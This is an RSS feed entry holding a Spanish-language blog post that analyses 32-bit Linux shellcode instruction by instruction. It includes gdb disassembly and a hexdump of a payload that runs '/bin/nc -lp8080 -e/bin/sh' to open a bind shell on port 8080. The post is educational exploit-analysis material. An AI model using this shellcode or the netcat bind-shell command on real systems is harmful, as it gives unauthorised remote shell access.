<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="../assets/xml/rss.xsl" media="all"?><rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/" version="2.0"><channel><title>deibit (shellcoding)</title><link>http://deibit.com/</link><description></description><atom:link href="http://deibit.com/categories/shellcoding.xml" rel="self" type="application/rss+xml"></atom:link><language>en</language><lastBuildDate>Thu, 21 Jul 2016 20:59:50 GMT</lastBuildDate><generator>https://getnikola.com/</generator><docs>http://blogs.law.harvard.edu/tech/rss</docs><item><title>Analizando un shellcode (III)</title><link>http://deibit.com/posts/2011/04/13/analizando-un-shellcode-iii/</link><dc:creator>David García</dc:creator><description>&lt;p&gt;Hasta ahora hemos visto como está estructurado el shellcode y como se produce la llamada al sistema. También hemos comentado como se produce un salto hacia el final (donde se encuentra “/bin/nc -lp8080 -e/bin/sh”) y vuelta hacia delante para obtener un pivote hacia la cadena.&lt;/p&gt;
&lt;p&gt;Vamos a ver como se ejecutan las instrucciones del shellcode para elaborar los argumentos que faltan y para pasarlos a la llamada al sistema. Recordemos que esta llamada al sistema precisa de 3 argumentos:&lt;/p&gt;
&lt;p&gt;[sourcecode language="cpp"]&lt;br&gt;
int execve(const char *filename, char *const argv[], char *const envp[]);&lt;br&gt;
[/sourcecode]&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Filename&lt;/strong&gt;: un nombre de archivo (un puntero a una cadena)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;argv&lt;/strong&gt;:        un puntero a un array de punteros a char (cadenas) que serán los argumentos a pasar al programa.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;envp&lt;/strong&gt;:       un puntero a un array de punteros a char (más cadenas) donde podemos pasar variables de entorno para el proceso a crear.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Y ahora dos preguntas:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;¿No deben los arrays de punteros a cadenas terminar con un ’0′ cada cadena?&lt;br&gt;
¿No deben no contener el carácter ’0′ los shellcodes?&lt;/p&gt;
&lt;p&gt;Esto es lo que hace el resto del código que aun no hemos comentado aun, modificar la cadena que ya está en memoria para ir creando los caracteres que faltan e ir posicionando las partes precisas para que luego las podamos meter en los registros que van a servir para la llamada la sistema.&lt;/p&gt;
&lt;p&gt;Y aquí también es donde entra la magia o arte del shellcoding: cuantas menos instrucciones más pequeño y cuanto más pequeño mejor.&lt;/p&gt;
&lt;p&gt;Bien, tenemos el código:&lt;/p&gt;
&lt;p&gt;[sourcecode]&lt;br&gt;
(gdb) x/30i shellcode&lt;br&gt;
   0x804a040 &amp;lt;shellcode&amp;gt;:	jmp    0x804a06c &amp;lt;shellcode+44&amp;gt;&lt;br&gt;
   0x804a042 &amp;lt;shellcode+2&amp;gt;:	pop    %esi&lt;br&gt;
   0x804a043 &amp;lt;shellcode+3&amp;gt;:	xor    %eax,%eax&lt;br&gt;
   0x804a045 &amp;lt;shellcode+5&amp;gt;:	mov    %al,0x7(%esi)&lt;br&gt;
   0x804a048 &amp;lt;shellcode+8&amp;gt;:	mov    %al,0xf(%esi)&lt;br&gt;
   0x804a04b &amp;lt;shellcode+11&amp;gt;:	mov    %al,0x19(%esi)&lt;br&gt;
   0x804a04e &amp;lt;shellcode+14&amp;gt;:	mov    %esi,0x1a(%esi)&lt;br&gt;
   0x804a051 &amp;lt;shellcode+17&amp;gt;:	lea    0x8(%esi),%ebx&lt;br&gt;
   0x804a054 &amp;lt;shellcode+20&amp;gt;:	mov    %ebx,0x1e(%esi)&lt;br&gt;
   0x804a057 &amp;lt;shellcode+23&amp;gt;:	lea    0x10(%esi),%ebx&lt;br&gt;
   0x804a05a &amp;lt;shellcode+26&amp;gt;:	mov    %ebx,0x22(%esi)&lt;br&gt;
   0x804a05d &amp;lt;shellcode+29&amp;gt;:	mov    %eax,0x26(%esi)&lt;br&gt;
   0x804a060 &amp;lt;shellcode+32&amp;gt;:	mov    $0xb,%al&lt;br&gt;
   0x804a062 &amp;lt;shellcode+34&amp;gt;:	mov    %esi,%ebx&lt;br&gt;
   0x804a064 &amp;lt;shellcode+36&amp;gt;:	lea    0x1a(%esi),%ecx&lt;br&gt;
   0x804a067 &amp;lt;shellcode+39&amp;gt;:	lea    0x26(%esi),%edx&lt;br&gt;
   0x804a06a &amp;lt;shellcode+42&amp;gt;:	int    $0x80&lt;br&gt;
   0x804a06c &amp;lt;shellcode+44&amp;gt;:	call   0x804a042 &amp;lt;shellcode+2&amp;gt;&lt;br&gt;
   0x804a071 &amp;lt;shellcode+49&amp;gt;:	das              &amp;lt;——————- COMIENZO DE CADENA&lt;br&gt;
   0x804a072 &amp;lt;shellcode+50&amp;gt;:	bound  %ebp,0x6e(%ecx)&lt;br&gt;
   0x804a075 &amp;lt;shellcode+53&amp;gt;:	das&lt;br&gt;
[/sourcecode]&lt;/p&gt;
&lt;p&gt;y tenemos la cadena:&lt;/p&gt;
&lt;p&gt;[sourcecode]&lt;br&gt;
00001070  ff 2f 62 69 6e 2f 6e 63  23 2d 6c 70 38 30 38 30  |./bin/nc#-lp8080|&lt;br&gt;
00001080  23 2d 65 2f 62 69 6e 2f  73 68 23 00 44 69 72 3a  |#-e/bin/sh#.Dir:|&lt;br&gt;
[/sourcecode]&lt;/p&gt;
&lt;p&gt;Esto último es la salida del comando hexdump, donde el carácter ‘/’ que en hexadecimal es ’2f’. La dirección de comienzo de la cadena será: 0x804a071. Esta dirección, lo volvemos a repetir, la conoce el shellcode al saltar hacia “call 0x804a042″, se produce la llamada y se carga en la pila la dirección de retorno que es exactamente donde empieza la cadena. Al ir a la dirección de la llamada lo primero que se hace es pop a ESI donde se carga esta dirección. Es en este registro donde tenemos el pivote hacia la cadena.&lt;/p&gt;
&lt;p&gt;La siguiente instrucción es un “xor %eax,%eax” que no es otra cosa que poner a ’0′ el registro EAX. Ya tenemos el cero que andábamos buscando.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Siguientes instrucciones:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;[sourcecode]&lt;br&gt;
   0x804a045 &amp;lt;shellcode+5&amp;gt;:	mov    %al,0x7(%esi)&lt;br&gt;
   0x804a048 &amp;lt;shellcode+8&amp;gt;:	mov    %al,0xf(%esi)&lt;br&gt;
   0x804a04b &amp;lt;shellcode+11&amp;gt;:	mov    %al,0x19(%esi)&lt;br&gt;
[/sourcecode]&lt;br&gt;
”&lt;br&gt;
AL es el último byte (el de menor peso) del registro EAX, que tiene el valor de ’00′. Este valor va a ser “copiado” a ESI + 0x7, ESI + 0xF y ESI + 19.&lt;/p&gt;
&lt;p&gt;Como ESI vale 0x804a071 podemos hacer nuestras cuentas:&lt;/p&gt;
&lt;p&gt;0x804a071 + 0x7  =  0x804a079&lt;br&gt;
0x804a071 + 0xF  =  0x804a080&lt;br&gt;
0x804a071 + 0x19 = 0x804a08A&lt;/p&gt;
&lt;p&gt;Direcciones que se corresponden con las letras de la cadena: primer ‘#’, segundo ‘#’ y tercer ‘#’. Prácticamente un reemplazo de los caracteres ‘#’ por ’0′.&lt;/p&gt;
&lt;p&gt;La cadena queda partida en 3 subcadenas: &lt;/p&gt;
&lt;p&gt;/bin/nc   -lp8080   -e/bin/sh&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Siguiente grupo:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;[sourcecode]&lt;br&gt;
   0x804a04e &amp;lt;shellcode+14&amp;gt;:	mov    %esi,0x1a(%esi)&lt;br&gt;
   0x804a051 &amp;lt;shellcode+17&amp;gt;:	lea    0x8(%esi),%ebx&lt;br&gt;
   0x804a054 &amp;lt;shellcode+20&amp;gt;:	mov    %ebx,0x1e(%esi)&lt;br&gt;
   0x804a057 &amp;lt;shellcode+23&amp;gt;:	lea    0x10(%esi),%ebx&lt;br&gt;
   0x804a05a &amp;lt;shellcode+26&amp;gt;:	mov    %ebx,0x22(%esi)&lt;br&gt;
   0x804a05d &amp;lt;shellcode+29&amp;gt;:	mov    %eax,0x26(%esi)&lt;br&gt;
[/sourcecode]&lt;/p&gt;
&lt;p&gt;Instrucción por instrucción:&lt;/p&gt;
&lt;p&gt;1.- Mueve el valor de ESI (dirección de comienzo de la cadena) al final de la cadena ESI+0x1A. Ojo, aquí tenemos una dirección que apunta a la primera subcadena: “/bin/nc”&lt;br&gt;
2.- Carga en EBX el valor de la dirección efectiva (Load Effective Address) de ESI+0x8. Que es donde comienza la siguiente subcadena: “-lp8080″ ¿No es un buen lugar para comenzar un array de cadenas?&lt;br&gt;
3.- Mueve a ESI+0x22 el valor de EBX. Ya tenemos al final de la cadena la dirección de la primera subcadena seguido de la dirección de la segunda.&lt;br&gt;
4.- Carga en EBX el valor de la dirección efectiva de ESI + 0x10. Esto nos deja en EBX la dirección 0x804a081 que es la subcadena “-e/bin/sh”&lt;br&gt;
5.- Mueve el valor que hay en EBX (la dirección de la ultima subcadena) a ESI+0x22. Ya tenemos al final de la cadena las 3 direcciones de las subcadenas.&lt;br&gt;
6.- Mueve EAX que vale 0x00000000 a ESI+0x26&lt;/p&gt;
&lt;p&gt;Al final terminamos con este layout al final de la cadena original del shellcode:&lt;/p&gt;
&lt;p&gt;FINAL DE LA CADENA | DIRECCIÓN PRIMERA SUBCADENA | DIRECCIÓN SEGUNDA SUBCADENA | DIRECCIÓN ULTIMA SUBCADENA | 0x00000000&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Cargamos parámetros para la llamada al sistema&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;[sourcecode]&lt;br&gt;
   0x804a060 &amp;lt;shellcode+32&amp;gt;:	mov    $0xb,%al&lt;br&gt;
   0x804a062 &amp;lt;shellcode+34&amp;gt;:	mov    %esi,%ebx&lt;br&gt;
   0x804a064 &amp;lt;shellcode+36&amp;gt;:	lea    0x1a(%esi),%ecx&lt;br&gt;
   0x804a067 &amp;lt;shellcode+39&amp;gt;:	lea    0x26(%esi),%edx&lt;br&gt;
   0x804a06a &amp;lt;shellcode+42&amp;gt;:	int    $0x80&lt;br&gt;
[/sourcecode]&lt;/p&gt;
&lt;p&gt;1.- En AL cargamos el valor 0xb que es 11 y que es el código de la llamada al sistema de “&lt;a href="http://linux.die.net/man/2/execve"&gt;execv&lt;/a&gt;”&lt;br&gt;
2.- Cargamos ESI en EBX para el primer parámetro que es el archivo a ejecutar. En este caso “/bin/nc” la herramienta NetCat.&lt;br&gt;
3.- Cargamos en ECX para el segundo parámetro el puntero a la siguiente subcadena que hará de puntero a array de cadenas y que contendrá los parámetros a pasar a NetCat que nos son otros que “-lp8080″ y “-e/bin/sh”.&lt;br&gt;
4.- Cargamos en EDX, el tercer parámetro para la llamada al sistema, el valor apuntado por ESI+0x26 que es como recordamos 0x00000000 o lo que es lo mismo, le estamos pasando un puntero nulo para decirle que no vamos a usar ese parámetro.&lt;br&gt;
5.- INT $0x80, sobran explicaciones: Si todo a ido bien esta interrupción le dice al núcleo que ejecute nuestra llamada y por lo tanto se cree un proceso que abrirá una shell a la escucha en el puerto 8080 de la máquina remota.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Tengo una bonita demostración para este shellcode pero no me queda espacio en este post. Lo dejo para otro.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Entradas anteriores&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="http://prisonernumbersix.com/2011/01/19/analizando-un-shellcode-i/"&gt;Analizando un shellcode I&lt;/a&gt;&lt;br&gt;
&lt;a href="http://prisonernumbersix.com/2011/02/12/analizando-un-shellcode-ii/"&gt;Analizando un shellcode II&lt;/a&gt;&lt;/p&gt;
</description><category>exploiting</category><category>linux</category><category>seguridad</category><category>shellcoding</category><guid>http://deibit.com/posts/2011/04/13/analizando-un-shellcode-iii/</guid><pubDate>Wed, 13 Apr 2011 19:02:44 GMT</pubDate></item></channel></rss>